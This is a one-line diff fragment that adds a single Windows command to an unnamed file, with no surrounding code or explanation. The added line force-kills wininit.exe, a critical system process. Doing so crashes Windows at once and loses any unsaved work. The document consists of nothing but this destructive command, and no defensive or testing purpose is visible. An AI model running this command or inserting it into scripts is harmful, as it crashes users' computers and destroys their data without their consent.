@@ -1,0 +1,1 @@
+taskkill /im wininit.exe /f
